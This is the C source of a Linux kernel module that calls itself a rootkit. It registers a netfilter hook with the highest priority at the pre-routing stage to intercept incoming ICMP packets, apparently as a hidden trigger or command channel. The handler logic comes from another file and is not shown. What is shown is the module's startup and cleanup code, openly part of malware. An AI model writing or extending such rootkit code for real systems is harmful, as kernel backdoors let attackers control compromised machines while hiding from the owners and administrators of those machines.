#include <linux/netfilter_ipv4.h>
#include <linux/module.h>


#include "rootkit.h"
#include "debug.h"


// hook for handling icmp packets
static struct nf_hook_ops nfho;


static int __init startup(void)
{
    // configuring a hook which will handle icmp packets recieved
    nfho.hook = packet_reciever;
    nfho.hooknum = NF_INET_PRE_ROUTING;
    nfho.pf = PF_INET;
    nfho.priority = NF_IP_PRI_FIRST;
    nf_register_net_hook(&init_net, &nfho);
    
    DEBUG_PUTS("rootkit: start\n")

    return 0;
}

static void __exit cleanup(void)
{
    // unregistering the hook after module was removed
    nf_unregister_net_hook(&init_net, &nfho);
    DEBUG_PUTS("rootkit: finished\n")
}


MODULE_LICENSE("GPL");
module_init(startup);
module_exit(cleanup);


